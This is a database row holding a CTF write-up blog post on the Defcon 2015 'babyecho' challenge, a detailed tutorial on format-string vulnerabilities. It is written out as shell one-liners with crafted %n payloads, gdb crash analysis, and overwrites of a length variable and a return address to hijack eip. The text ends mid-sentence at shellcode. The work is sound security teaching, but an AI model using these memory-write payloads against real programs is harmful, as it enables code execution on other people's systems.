INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'Defcon Quals: babyecho (format string vulns in gory detail)', 'Ron Bowes', '2015-5-22', 'Welcome to the third (and penultimate) blog post about the 2015 Defcon Qualification CTF! This is going to be a writeup of the \"babyecho\" level, as well as a thorough overview of format-string vulnerabilities! I really like format string vulnerabilities - they\'re essentially a \"read or write anywhere\" primitive - so I\'m excited to finally write about them!\nYou can grab the binary here, and you can get my exploit and some other files on this Github repo.\n\n.in { color: #dc322f; font-weight: bold; }\nHow printf works\nBefore understanding how a format string vulnerability works, we first have to understand what a format string is. This is a pretty long and detailed section (can you believe I initially wrote \"this will be quick\" before I got going?), but if you have a decent idea of how the stack and how printf() work, then you can go ahead and skip to the next section.\nSo... what is a format string exactly? A format string is something you see fairly frequently in code, and looks like this:\n\r\nprintf(\"The total of %s is %d\", str, num);\r\n\nEssentially, there are a bunch of functions in libc and elsewhere - printf(), sprintf(), and fprintf() to name a few - that require a format string and then 0 or more arguments. In the case of above, the format string is \"The total of %s is %d\" and the parameters are \"str\" and \"num\". The printf() function replaces the %s with the first argument - a pointer to a string - and %d with the second argument - an integer.\nTo understand how this works, it helps to understand how the stack works. Check out my post on r0pbaby if you want more general information on stacks (this is going to be targeted specifically at how printf() uses it).\nLet\'s jump right in and look at what the assembly version of that code snippit might look like:\n\r\npush num\r\npush str\r\npush \"The total of %s is %d\" ; you can\'t actually do this in assembly\r\ncall printf\r\nadd esp, 0x0c\r\n\nEssentially, this code pushes three arguments onto the stack - the same three arguments that you would pass to printf() in C - for a total of 12 bytes (we\'re assuming x86 here, but x64 works almost identically). Then it calls printf(). After printf() does its thing and returns, 0x0c (12) is added to the stack - essentially removing the three variables that were pushed (three pushes = 12 bytes onto the stack, subtracting 12 = 12 bytes off the stack).\nWhen printf() starts, it doesn\'t technically know how many arguments it received. Much like when we discuss ROP (return-oriented programming), the important thing is this: when we reach line 1 of printf(), printf() assumes everything is set up properly. It doesn\'t know how many arguments were passed, and it doesn\'t know where it was called from - it just knows that it\'s starting and it\'s supposed to do its thing, otherwise people will be upset.\nSo when printf() runs, it grabs the format string from the stack. It looks at how many format specifiers (\"%d\"/\"%s\"/etc.) it has, and starts reading them off the stack. It doesn\'t care if nobody put them there - as far as printf() is concerned, the stack is just a bunch of data, and it can read as far up into the data as it wants (till it hits the end).\nSo let\'s say you do this (and I challenge you to find me a C programmer who hasn\'t at some point):\n\r\n$ cat > test.c\r\n\r\n#include <stdio.h>\r\n\r\nint main(int argc, const char *argv[])\r\n{\r\n  printf(\"%x %x %x\\n\");\r\n\r\n  return 0;\r\n}\r\n\nThen compile it:\n\r\n$ make test\r\ncc     test.c   -o test\r\ntest.c: In function ‘main’:\r\ntest.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]\r\ntest.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]\r\ntest.c:5:3: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat]\r\n\nNotice that gcc complains that you\'re doing it wrong, but they\'re only warnings! It\'s perfectly happy to let you try.\nThen run the program and marvel at the results:\n\r\n$ ./test\r\nffffd9d8 ffffd9e8 40054a\r\n\nNow where the heck did that come from!?\nWell, as I already mentioned, we\'re reading whatever happened to be on the stack! Let\'s look at it one more way before we move on: we\'ll use a stack diagram like we did in r0pbaby to explain things.\nLet\'s say you have a function called func_a(). func_a() might look like this:\n\r\nint func_a(int param_b, int param_c)\r\n{\r\n  int local_d = 0x123;\r\n  char local_e[12] = \"AAAABBBBCCCC\";\r\n\r\n  printf(\"%x %x %x %x %x %x %x\\n\");\r\n}\r\n\nWhen func_a() is called by another function, in assembly, it\'ll look like this:\n\r\n; In C --> func_a(1000, 10);\r\npush 10\r\npush 1000\r\ncall func_a\r\nadd esp, 8\r\n\nand the stack will look like this immediately after the call to func_a() is made (in other words, when it\'s on the first line of func_a()):\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|...data from caller...|\r\n+----------------------+\r\n+----------------------+\r\n|          10          | <-- param_c\r\n+----------------------+\r\n|         1000         | <-- param_b\r\n+----------------------+\r\n|     [return addr]    | <-- esp points here\r\n+----------------------+\r\n+----------------------+\r\n|.....unallocated......|\r\n+----------------------+\r\n|...lower addresses....| <-- other data from previous function\r\n+----------------------+\r\n\nfunc_a() will look something like this:\n\r\nfunc_a:\r\n  push ebp         ; Back up the old frame pointer\r\n  mov ebp, esp     ; Create the new frame pointer\r\n  sub esp, 0x10    ; Make room for 16 bytes of local vars\r\n\r\n  mov [ebp-0x04], 0x123 ; Set a local var to 123\r\n  mov [ebp-0x08], 0x41414141 ; \"AAAA\"\r\n  mov [ebp-0x0c], 0x42424242 ; \"BBBB\"\r\n  mov [ebp-0x10], 0x43434343 ; \"CCCC\"\r\n\r\n  ; format_string would be stored elsewhere, like in .data\r\n  push format_string ; \"%x %x %x %x %x %x %x\\n\"\r\n  call printf      ; Call printf\r\n  add esp, 4       ; Remove the format string from the stack\r\n\r\n  add esp, 0x10    ; Get rid of the locals from the stack\r\n  pop ebp          ; Restore the previous frame pointer\r\n  ret              ; Return\r\n\nIt\'s important to note: this is assuming a completely naive compilation, which basically never happens. In reality, a few things would change; for example, local_e may be initialized differently (and likely be padded to 0x10 bytes), plus there will probably be some saved registers taking up space. That being said, the principles won\'t change - you might just have to mess around with addresses and experiment with the function.\nLooking at that code, you might see that the start and the end of the function are more or less mirrors of each other. It starts by saving ebp and making room on the stack, and ends with getting rid of the room and restoring the saved ebp.\nWhat\'s important, though, is what the stack looks like at the moment we call printf(). This is it:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|...data from caller...|\r\n+----------------------+\r\n+----------------------+\r\n|          10          | <-- param_c\r\n+----------------------+\r\n|         1000         | <-- param_b\r\n+----------------------+\r\n|     [return addr]    |\r\n+----------------------+\r\n|      [saved ebp]     | <-- From the \"push ebp\"\r\n+----------------------+\r\n|       0x123          | <-- local_d\r\n+----------------------+\r\n|        CCCC          |\r\n|        BBBB          | <-- local_e (12 bytes)\r\n|        AAAA          |        (remember, higher addresses are upwards)\r\n+----------------------+\r\n+----------------------+\r\n|    format_string     | <-- format string was pushed onto the stack\r\n+----------------------+ <-- esp points here\r\n|.....unallocated......|\r\n+----------------------+\r\n|...lower addresses....| \nWhen printf() is called, its return address is pushed onto the stack, and it does whatever it needs to do with its own local variables. But here\'s the kicker: it thinks it has arguments on the stack! Here\'s printf()\'s view of the function:\n\r\n+----------------------+\r\n|...higher addresses...|\r\n+----------------------+\r\n|...data from caller...|\r\n+----------------------+\r\n+----------------------+\r\n|          10          |\r\n+----------------------+\r\n|         1000         | <-- seventh format parameter\r\n+----------------------+\r\n|     [return addr]    | <-- sixth format parameter\r\n+----------------------+\r\n|      [saved ebp]     | <-- fifth format parameter\r\n+----------------------+\r\n|       0x123          | <-- fourth format parameter\r\n+----------------------+\r\n|        CCCC          | <-- third format parameter\r\n|        BBBB          | <-- second format parameter\r\n|        AAAA          | <-- first format parameter\r\n+----------------------+\r\n+----------------------+\r\n|    format_string     | <-- format string was pushed onto the stack\r\n+----------------------+\r\n|     [return addr]    | <-- printf\'s return address\r\n+----------------------+ <-- esp points somewhere down here\r\n|...lower addresses....| \nSo what\'s printf going to do? It\'s going to print \"0x41414141\" (\"AAAA\"), then \"0x42424242\" (\"BBBB\"), then \"0x43434343\" (\"CCCC\"), then \"0x123\", then the saved ebp value, then the return address, then \"0x3e8\" (1000).\nWhy\'s printf() doing that? Because it doesn\'t know any better. You told it (in the format string) that it has arguments, so it thinks it has arguments!\nJust for fun, I decided to try running the program to see how close I was:\n\r\n$ cat > test.c\r\n#include <stdio.h>\r\n\r\nint func_a(int param_b, int param_c)\r\n{\r\n  int local_d = 0x123;\r\n  char local_e[12] = \"AAAABBBBCCCC\";\r\n\r\n  printf(\"%x %x %x %x %x %x %x\\n\");\r\n}\r\n\r\nint main(int argc, const char *argv[])\r\n{\r\n  func_a(1000, 10);\r\n\r\n  return 0;\r\n}\r\n$ make test\r\ncc test.c   -o test\r\n$ ./test\r\n80495e4 fffffc68 80482c8 41414141 42424242 43434343 123\r\n\nEnd result: I was closer than I thought I\'d be! There are three pointers (it looks like two pointers within the binary and one from the stack, if I had to guess) that come from who-knows-where, but the rest is there. I added five more \"%x\"s to the string to see if we could get the parameters:\n\r\n$ ./test\r\n80495f8 fffffc68 80482c8 41414141 42424242 43434343 123 b7fcc304 b7fcbff4 fffffc98 8048412 3e8 a\r\n\nThere we go! We can see 0x3e8 (the first parameter, 1000), 0xa (the second parameter, 10), then 0x8048412 (which will be the return address) and 0xfffffc98 (which will be the saved ebp value). The two unknown values after (0xb7fcbff4 and 0xb7fcc304) are likely saved registers, which I confirmed with objdump:\n\r\n$ objdump -D -M intel test\r\n[...]\r\n  40054a:       55                      push   rbp\r\n  40054b:       48 89 e5                mov    rbp,rsp\r\n  40054e:       48 83 ec 20             sub    rsp,0x20\r\n  400552:       89 7d ec                mov    DWORD PTR [rbp-0x14],edi\r\n  400555:       89 75 e8                mov    DWORD PTR [rbp-0x18],esi\r\n  400558:       c7 45 fc 23 01 00 00    mov    DWORD PTR [rbp-0x4],0x123\r\n[...]\r\n\nprintf() - the important bits\nWe\'ve seen how to read off the stack with a format-string vulnerability. What else can we do? At this point, we\'ll switch to the binary from the game for the remainder of the testing.\nThe game binary is really easy.. it\'s a pretty standard format string vulnerability:\n\r\n$ ./babyecho\r\nReading 13 bytes\r\nhello\r\nhello\r\nReading 13 bytes\r\n%x\r\nd\r\nReading 13 bytes\r\n%x %x %x\r\nd a 0\r\nReading 13 bytes\r\n%x%x%x%x %x\r\nda0d fffff87c\r\n\nBasically, it\'s doing printf(attacker_str) - simple, but a vulnerability. The right way to do it is printf(\"%s\", atatcker_str) - that way, attacker_str won\'t be mistaken for a format string.\nThe first important bit is that, with just that simple mistake in development, we can crash the binary:\n\r\n$ ./babyecho\r\nReading 13 bytes\r\n%s\r\nSegmentation fault (core dumped)\r\n\nAnd we can read strings:\n\r\nReading 13 bytes\r\n%x%x%x%x %x\r\nda0d fffff87c\r\n$ ./babyecho\r\nReading 13 bytes\r\n%x%x%x%x %s\r\nda0d %x%x%x%x %s\r\n\n...confusingly, the string at 0xfffff87c was a pointer to the format string itself.\nAnd, with %n, we can crash another way:\n\r\nReading 13 bytes\r\n%x%x%x%x %n\r\nda0d _n\r\n\n...or can we? It looks like the level filtered out %n! But, of course, we can get around that if we want to:\n\r\n$ ./babyecho\r\nReading 13 bytes\r\n%n\r\n_n\r\nReading 13 bytes\r\n%hn\r\nSegmentation fault (core dumped)\r\n\nSo we have that in our pocket if we need it. Let\'s talk about %n for a minute...\n%n? Who uses that?\nIf you\'re a developer, you\'ve most likely seen and used %d and %s. You\'ve probably also seen %x and %p. But have you ever heard of %n?\nAs far as I can tell, %n was added to printf() specifically to make it possible to exploit format string vulnerabilities. I don\'t see any other use for it, really.\n%n calculates the number of bytes printf() has output so far, and writes it to the appropriate variable. In other words, this:\n\r\nint a;\r\nprintf(\"%n\", &a);\r\n\nwill write 0 to the variable a, because nothing has been output. This code:\n\r\nint a;\r\nprintf(\"AAAA%n\", &a);\r\n\nwill write 4 to the variable a. And this:\n\r\nprintf(\"%100x%n\");\r\n\nwill write the number 100 (%100x outputs a 100-byte hex number whose value is whatever happens to be next on the stack) to the address that happens to be second on the stack (right after the format string). If it\'s a valid address, it writes to that memory address. If it\'s an invalid address, it crashes.\nGuess what? That\'s basically an arbitrary memory write. We\'ll see more later!\nCramming bytes in\nNow, let\'s talk about how we\'re only allowed 13 bytes for the challenge (\"Reading 13 bytes\"). 13 bytes isn\'t enough to do a proper format string exploit in many cases (sometimes it is!). To do a proper exploit, you need to be able to provide an address (4 bytes on 32-bit), %NNx to waste bytes (4-5 more bytes), and then %N$n (another 4-5 bytes). That\'s a total of 12 bytes in the best case. And, for reasons that\'ll become abundantly clear, you have to do it four times.\nThat means we need a way to input longer strings! Thankfully, a 13-byte format string IS long enough to write a single byte to anywhere in memory. We\'ll do that in the next section, but first I want to introduce another printf() feature that was probably designed for hackers: %123$x.\n%123$x means \"read the 123rd argument\". The idea is that this is inefficient:\n\r\nprintf(\"The value is %d [0x%02x]\\n\", value, value);\r\n\nso instead, you can save 4 bytes of stack memory (otherwise known as approximately 0.0000000125% of my total memory) and a push operation (somewhere around 1 clock cycle on my 3.2mhz machine) by making everything a little more confusing:\n\r\nprintf(\"The value is %d [0x%1$02x]\\n\", value);\r\n\nSeriously, that actually works. You can try it!\nThe cool thing about that is instead of only being able to access six stack elements (\"%x%x%x%x%x%x%\"), we can read any variable on the stack! Check out how much space it saves:\n\r\nReading 13 bytes\r\n%x%x%x%x %x\r\nda0d ffffc69c\r\nReading 13 bytes\r\n%5$x\r\nffffc69c\r\n\nStarting to build the exploit\nLet\'s write a quick bash script to print off %1$x, %2$x, %3$x, ...etc:\n\r\n$ for i in `seq 1 200`; do echo -e \"$i:0x%$i\\$x\" | ./babyecho; done | grep -v Reading | grep -v \'0x0$\'\r\n1:0xd\r\n2:0xa\r\n4:0xd\r\n5:0xffffc69c\r\n7:0x78303a37\r\n8:0x78243825\r\n135:0xffffc98c\r\n136:0x8048034\r\n138:0x80924d1\r\n139:0x80704fd\r\n140:0xffffc90a\r\n154:0x80ea570\r\n155:0x18\r\n157:0x2710\r\n158:0x14\r\n159:0x3\r\n160:0x28\r\n161:0x3\r\n163:0x38\r\n165:0x5b\r\n167:0x6e\r\n169:0x77\r\n171:0x7c\r\n175:0x80ea540\r\n...\r\n\nIf you run it a second time and any values change, be sure you turn off ASLR. It\'s totally possible to write an exploit for this challenge that assumes ASLR is on, but it\'s easier to explain one thing at a time. :)\nArbitrary memory read\nThe values at offset 7 and 8 are actually interesting.. let\'s take a quick look at them:\n\r\n$ ./babyecho\r\nReading 13 bytes\r\n%7$x\r\n78243725\r\n\nWhat\'s going on here?\nIt\'s printing the hex number 0x78243725, which is the 7th thing on the stack. Since it\'s little endian, that\'s actually \"25 37 24 78\" in memory, which, if you know your ASCII, is \"%7$x\". That looks a bit familiar, eh? The first 4 bytes of the string?\nLet\'s try making the first 4 bytes of the string something more recognizable:\n\r\n$ ./babyecho\r\nReading 13 bytes\r\nAAAA -> %7$x\r\nAAAA -> 41414141\r\nReading 13 bytes\r\nABCD -> %7$x\r\nABCD -> 44434241\r\n\nSo it\'s printing the first 4 bytes of itself! That\'s extremely important, because if we now change %...x to %...s, we get:\n\r\n$ ulimit -c unlimited\r\n$ echo -e \'AAAA%7$s\' | ./babyecho\r\n\r\nReading 13 bytes\r\nSegmentation fault (core dumped)\r\n\n...a crash! And if we investigate the crash:\n\r\n$ gdb -q ./babyecho ./core\r\nCore was generated by `./babyecho\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x0807f134 in ?? ()\r\n(gdb) x/i $eip\r\n=> 0x807f134:   repnz scas al,BYTE PTR es:[edi]\r\n(gdb) print/x $edi\r\n$1 = 0x41414141\r\n\nWe determine that it crashed while trying to read edi, which is 0x41414141. And we can use any address we want - for example, I grabbed a random string from IDA - 0x080C1B94 - so let\'s encode that in little endian and use it:\n\r\n$ echo -e \'\\x94\\x1b\\x0c\\x08%7$s\' | ./babyecho\r\nReading 13 bytes\r\n../sysdeps/unix/sysv/linux/getcwd.c\r\n\nIt prints out the string! If I really want to, I can chain together a few:\n\r\n$ echo -e \'\\x06\\x1d\\x0c\\x08%7$s\\n\\x1f\\x1d\\x0c\\x08%7$s\\n\' | ./babyecho\r\nReading 13 bytes\r\nbuffer overflow detected\r\nReading 13 bytes\r\nstack smashing detected\r\n\nIt didn\'t really detect any of those, of course - I\'m just printing out those strings for fun :)\nArbitrary memory write\nThat\'s an arbitrary memory read. And as a side effect, we\'ve also bypassed ASLR if that\'s applicable (in this level, it\'s not really).\nNow let\'s go back to our code that tried to read 0x41414141 (\"AAAA%7$s\") and change the %..s to a %..n:\n\r\n$ ulimit -c unlimited\r\n$ echo -e \'AAAA%7$n\' | ./babyecho\r\nReading 13 bytes\r\nSegmentation fault (core dumped)\r\n\nno surprise there.. let\'s see what happened:\n\r\n$ gdb -q ./babyecho ./core\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x08080c2a in ?? ()\r\n(gdb) x/i $eip\r\n=> 0x8080c2a:   mov    DWORD PTR [eax],ecx\r\n(gdb) print/x $eax\r\n$1 = 0x41414141\r\n(gdb) print/x $ecx\r\n$2 = 0x4\r\n\nSo it crashed while trying to write 0x4 - a value we sort of control - into 0x41414141 - a value we totally control.\nOf course, writing the value 0x4 every time is boring, but we can change to anything - let\'s try to make it 0x80:\n\r\n$ echo -e \'AAAA%124x%7$n\' | ./babyecho\r\nReading 13 bytes\r\nAAAA                                                                                                                           d%\r\nReading 13 bytes\r\n\r\nReading 13 bytes\r\n\nUh oh! What happened?\nUnfortunately, that string is one byte too long, which means the %n isn\'t getting hit. We need to deal with this pesky length problem!\nMaking it longer\nThe maximum length for the string is 13 - 0x0d - bytes. Presumably that value is stored on the stack somewhere, and it is:\n\r\n$ for i in `seq 1 2000`; do echo -e \"$i:0x%$i\\$x\" | ./babyecho; done | grep \":0xd$\"\r\n1:0xd\r\n4:0xd\r\n246:0xd\r\n385:0xd\r\n\nThe problem is, to write that, we need an absolute address. \"AAAA%7$n\" writes to the address \"AAAA\", but we need to know which address those 0xd\'s live at.\nThere are a lot of different ways to do this, but none of them are particularly nice. One of the easiest ways is to use one of those corefiles from earlier, grab the \'esp\' register (the stack pointer), and read upwards from esp till we hit the top of the stack.\nThe most recent corefile was caused by trying to write to 0x41414141, which is just fine. We\'re going to basically read everything on the stack at the time it crashed (somewhere in printf()):\n\r\n(gdb) x/i $eip\r\n=> 0x8080c2a:   mov    DWORD PTR [eax],ecx\r\n(gdb) print/x $esp\r\n$2 = 0xffff9420\r\n(gdb) x/10000xw $esp\r\n0xffff9420:     0xffff94b0      0x00000000      0x0000001c      0x00000000\r\n0xffff9430:     0x00000000      0x00000000      0x00000000      0x00000000\r\n0xffff9440:     0x0000000d      0x00000000      0x00000000      0x0000000a\r\n...\r\n0xffff9460:     0x00000000      0x0000000d      0x00000000      0x00000000\r\n...\r\n0xffffc690:     0x0000000d      0xffffc69c      0x00000000      0x41414141\r\n0xffffc680:     0xffffc69c      0x0000000d      0x0000000a      0x00000000\r\n...\r\n0xffffca50:     0x00000028      0x00000007      0x0000000d      0x00008000\r\n0xffffdff0:     0x65796261      0x006f6863      0x00000000      0x00000000\r\n0xffffe000:     Cannot access memory at address 0xffffe000\r\n\nSo we have five instances of 0x0000000d:\n\n0xffff9440\n0xffff9464\n0xffffc684\n0xffffc690\n0xffffca58\n\nWe try modifying each of them using our %n arbitrary write to see what happens:\n\r\n$ echo -e \'\\x40\\x94\\xff\\xff%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....\r\nReading 13 bytes\r\n\n\r\n$ echo -e \'\\x64\\x94\\xff\\xff%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....\r\nReading 13 bytes\r\n\n\r\n$ echo -e \'\\x84\\xc6\\xff\\xff%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....\r\nReading 13 bytes\r\n\n\r\n$ echo -e \'\\x90\\xc6\\xff\\xff%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....\r\nReading 4 bytes\r\n\nAha! We were able to overwrite the length value with the integer 4. Obviously we don\'t want 4, but because of the 13-byte limit the best we can do is 99 more:\n\r\n$ echo -e \'\\x90\\xc6\\xff\\xff%99x%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....                                                                                                  d\r\nReading 103 bytes\r\n\nor is it? We can actually mess with a different byte. In other words, instead of changing the last byte - 0x000000xx - we change the second last - 0x0000xx00 - which will be at the next address:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....                                                                                                  d\r\nReading 1023 bytes\r\n\n1023 bytes is pretty good! That\'s plenty of room to build a full exploit.\nControlling eip\nThe next step is to control eip - the instruction pointer, or the thing that says which instruction needs to run. Once we control eip, we can point it at some shellcode (code that gives us full control).\nThe easiest way to control eip is to overwrite a return address. As we learned somewhere wayyyyyyy up there, return addresses are stored on the stack the same way the length value was stored. And we can find it the same way - just go to where it crashed and find it.\nWe\'ll use the same ol\' value to crash it:\n\r\n$ ulimit -c unlimited\r\n$ echo -e \'AAAA%7$n\' | ./babyecho\r\nReading 13 bytes\r\nSegmentation fault (core dumped)\r\n$ gdb ./babyecho ./core\r\n...\r\n(gdb) bt\r\n#0  0x08080c2a in ?? ()\r\n#1  0x08081bb0 in ?? ()\r\n#2  0x0807d285 in ?? ()\r\n#3  0x0804f580 in ?? ()\r\n#4  0x08049014 in ?? ()\r\n#5  0x0804921a in ?? ()\r\n#6  0x08048d2b in ?? ()\r\n\n\"bt\" - or \"backtrace\" - prints the list of functions that were called to get to where you are. The call stack. If we can find any of those values on the stack, we can overwrite it and win. I arbitrarily chose 0x08081bb0 and found it at 0xffffa054, but it didn\'t work. Rather than spend a bunch of time troubleshooting, I found 0x0807d285 instead:\n\r\n(gdb) x/10000xw $esp\r\n0xffff9420:     0xffff94b0      0x00000000      0x0000001c      0x00000000\r\n0xffff9430:     0x00000000      0x00000000      0x00000000      0x00000000\r\n0xffff9440:     0x0000000d      0x00000000      0x00000000      0x0000000a\r\n...\r\n0xffffc140:     0x080ea200      0x080ea00c      0xffffc658      0x0807d285\r\n\nIt\'s stored at 0xffffc14c. Let\'s try changing it to something else:\n\r\n$ echo -e \'\\x4c\\xc1\\xff\\xff%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....Segmentation fault (core dumped)\r\n$ gdb -q ./babyecho ./core\r\nCore was generated by `./babyecho\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x00000004 in ?? ()\r\n\nWe overwrote the return address with 4, just like we\'d expect! Let\'s chain together the two exploits - the one for changing the length and the one for changing the return address (I\'m quoting the strings separately to make it more clear, but bash will automatically combine them):\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff%10000x%7$n\' | ./babyecho\r\nReading 13 bytes\r\n....                                                                                                  d\r\nReading 1023 bytes\r\nL...\r\n[...lots of empty space...]\r\n3ffSegmentation fault (core dumped)\r\n\r\n$ gdb -q ./babyecho ./core\r\nCore was generated by `./babyecho\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x00002714 in ?? ()\r\n\n0x2714 = 10004 - so we can definitely control the return address!\nWriting four bytes\nWhen we\'re running it locally, we can also go a little crazy:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff%1094795581x%7$n\' | ./babyecho > /dev/null\r\nsegmentation fault\r\n$ gdb -q ./babyecho ./core\r\nCore was generated by `./babyecho\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x41414141 in ?? ()\r\n\nWe use %1094795581x to write 0x4141413d bytes to stdout, then %7$n writes 0x41414141 to the return address. The problem is, if we were running that over the network, we\'d have to wait for them to send us 1,094,795,581 or so bytes, which is around a gigabyte, so that\'s probably not going to happen. :)\nWhat we need is to provide four separate addresses. We\'ve been using %7$n all along to access the address identified by the first four bytes of the string:\n\r\n\"AAAA%7$n\"\r\n\nBut we can actually do multiple addresses:\n\r\n\"AAAABBBBCCCCDDDD%7$n%8$n%9$n%10$n\"\r\n\nThat will try writing to the 7th thing on the stack - 0x41414141. If that succeeds, it\'ll write to the 8th thing - 0x42424242 - and so on. We can prove that by using %..x instead of %..n:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'AAAABBBBCCCCDDDD << %7$x * %8$x * %9$x * %10$x >>\' | ./babyecho\r\nReading 13 bytes\r\n....                                                                                                  d\r\nReading 1023 bytes\r\nAAAABBBBCCCCDDDD << 41414141 * 42424242 * 43434343 * 44444444 >>\r\n\nAs expected, the 7th, 8th, 9th, and 10th values on the stack were \"AAAA\", \"BBBB\", \"CCCC\", and \"DDDD\". If that doesn\'t make sense, go take a look at func_a(), which was one of my first examples, and which put AAAA, BBBB, and CCCC onto the stack.\nNow, since we can write to multiple addresses, instead of doing a single gigabyte of writing, we can do either two or four short writes. I\'ll do four, since that\'s more commonly seen. That means we\'re going to do something like this (once again, I\'m adding quotes to make it clear what\'s happening, they\'ll disappear):\n\r\n\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%49x%7$n\'\'%8$n\'\'%9$n\'\'%10$n\'\r\n\nBreaking it down:\n\nThe first 16 bytes are the four addresses - 0xffffc14c, 0xffffc14d, 0xffffc14e, and 0xffffc14f. Something interesting to note is that 0xffffc150 - 0xffffc152 will also get overwritten, but we aren\'t going to worry about those\n\"%49x\" will output 49 bytes. This is simply to pad our string to a total of 65 - 0x41 - bytes (49 bytes here + 16 bytes worth of addresses)\n\"%7$n\" will write the value 0x41 - the number of bytes that have so far been printed - to the first of the four addresses, which is 0x41414141 (\"AAAA\")\n\"%8$n\" will write 0x41 - still the number of printed bytes so far - to the second address, 0x42424242\n\"%9$n\" and \"%10$n\" do exactly the same thing to 0x43434343 and 0x44444444\n\nLet\'s give it a shot (I\'m going to start redirecting to /dev/null, because we really don\'t need to see the crap being printed anymore):\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%49x%7$n\'\'%8$n\'\'%9$n\'\'%10$n\' | ./babyecho > /dev/null\r\nSegmentation fault (core dumped)\r\n$ gdb -q ./babyecho ./core\r\nReading symbols from ./babyecho...(no debugging symbols found)...done.\r\n[New LWP 2662]\r\nCore was generated by `./babyecho\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x41414141 in ?? ()\r\n\nSweet! It worked!\nWhat happens if we want to write four different bytes? Let\'s say we want 0x41424344...\nIn memory, 0x41424344 is \"44 43 42 41\". That means we have to write 44, then 43, then 42, then 41.\n0x44 is easy. We know we\'re writing 16 bytes worth of addresses. To go from 16 to 0x44 (68) is 52 bytes. So we put \"%52x%7$n\" and our return address looks like this:\n\r\n?? ?? ?? ?? [44 00 00 00] ?? ?? ?? ??\r\n\nNext, we want to write 0x43 to the next address. We\'ve already output 0x44 bytes, so to output a total of 0x43 bytes, we\'ll have to wrap around. 0x44 + 0xff (255) = 0x0143. So if we use \"%255x%8$n\", we\'ll write 0x0143 to the next address, which will give us the following:\n\r\n?? ?? ?? ?? [44 43 01 00] 00 ?? ?? ??\r\n\nTwo things stick out here: first, there\'s a 0x01 that shouldn\'t be there. But that\'ll get overwritten so it doesn\'t matter. The second is that we\'ve now written one byte *past* our address. That means we\'re killing a legitimate variable, which may cause problems down the road. Luckily, in this level it doesn\'t matter - sucks to be that variable!\nAll right, so we\'ve done 0x44 and 0x43. Now we want 0x42. To go from 0x43 to 0x42 is once again 0xff (255) bytes, so we can do almost the same thing: \"%255x%9$n\". That\'ll make the total number of bytes printed 0x0242, and will make our return address:\n\r\n?? ?? ?? ?? [44 43 42 02] 00 00 ?? ??\r\n\nFinally, to go from 0x42 to 0x41, we need another 255 bytes, so we do the same thing one last time: \"%255x%10$n\", and our return address is now:\n\r\n?? ?? ?? ?? [44 43 42 41] 03 00 00 ??\r\n\nPutting that all together, we get:\n\r\n\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%52x%7$n\'\'%255x%8$n\'\'%255x%9$n\'\'%255x%10$n\'\r\n\nWe prepend our length-changer onto the front, and give it a whirl:\n\r\n$ echo -e \'\\x91\\xc6\\xff\\xff%99x%7$n\\n\'\'\\x4c\\xc1\\xff\\xff\'\'\\x4d\\xc1\\xff\\xff\'\'\\x4e\\xc1\\xff\\xff\'\'\\x4f\\xc1\\xff\\xff\'\'%52x%7$n\'\'%255x%8$n\'\'%255x%9$n\'\'%255x%10$n\' | ./babyecho > /dev/null\r\nSegmentation fault (core dumped)\r\n$ gdb -q ./babyecho ./core\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x41424344 in ?? ()\r\n\nI\'m happy to report that I\'m doing this all by hand to write the blog, and I got that working on my first try. :)\nA quick word of warning: if you\'re trying to jump to an address like 0x44434241, you have to write \"41 42 43 44\" to memory. To write the 0x41, as usual you\'ll want to use %49x%7$n. That means that 65 (0x41) bytes have been output so far. To then output 0x42, you need one more byte written. The problem is that %1x can output anything between 1 and 8 bytes, because it won\'t truncate the output. You have to use either \"%257x\" or just a single byte, like \"A\". I fought with that problem for quite some time during this level...\nLet\'s summarize what we\'ve done...\nI feel like I\'ve written a lot. According to my editor, I\'m at 708 lines right now. And it\'s all pretty crazy!\nSo here\'s a summary of where we are before we get to the last step...\n\nWe used %n and a static address to change the max length of the input string\nWe gave it four addresses to edit, which wind up on the stack (see func_a)\nWe use %NNx, where NN = the number of bytes we want to waste, to ensure %n writes the proper value\nWe use %7$n to write to the first address, %8$n to write to the second address, %9$n to write to the third address, and %10$n to write to the fourth, with a %NNx between each of them to make sure we waste the appropriate number of bytes\n\nAnd now for the final step...\nGoing somewhere useful\nFor the last part, instead of jumping to 0x41414141 or 0x41424344, we\'re going to jump to some shellcode. Shellcode is, basically, \"code that spawns a 